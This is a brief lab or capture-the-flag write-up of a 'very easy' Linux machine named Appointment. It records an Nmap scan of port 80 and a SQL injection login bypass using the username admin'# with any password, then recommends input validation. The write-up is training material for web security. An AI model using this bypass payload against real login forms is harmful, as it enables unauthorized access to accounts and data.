## General Information
- Machine: Appointment
- Difficulty: Very easy
- OS: Linux
- Date: 01/03/2023


## Methodology
- Reconnaissance: Execution of a port scan using Nmap to identify running services on the target machine.
- Exploitation: Utilization of a SQL Injection vulnerability in the web application by using the malicious input 'admin'# to bypass authentication and gain administrator access.
- Results Analysis: Documentation of findings, identification of vulnerabilities, and recommendations for remediation.


## Results
During the penetration test, a SQL Injection vulnerability was discovered in the system. By using the malicious input 'admin'# in the username field, it was possible to bypass authentication and gain administrator access without requiring a valid password.

### Reconnaissance
- IP: 10.129.233.223
- Port Scan results:

| Port   | State | Service | Version         |
|--------|-------|---------|-----------------|   
| 80/tcp |  open | http    | Apache httpd 2.4.38 ((Debian)) |

### Commands Used

#### Nmap 
~~~nmap
nmap -sVC -p 80 -oN ./version_service_scan_port80 10.129.233.223
~~~

#### SQL Injection
~~~SQL_injection 
http://10.129.233.223/
Login
- Username: admin'#
- Password: any
~~~


## Recommendations
- Implement robust input validation and sanitization mechanisms in the web application to prevent SQL Injection vulnerabilities. Ensure that user inputs are properly validated and sanitized before being used in database queries.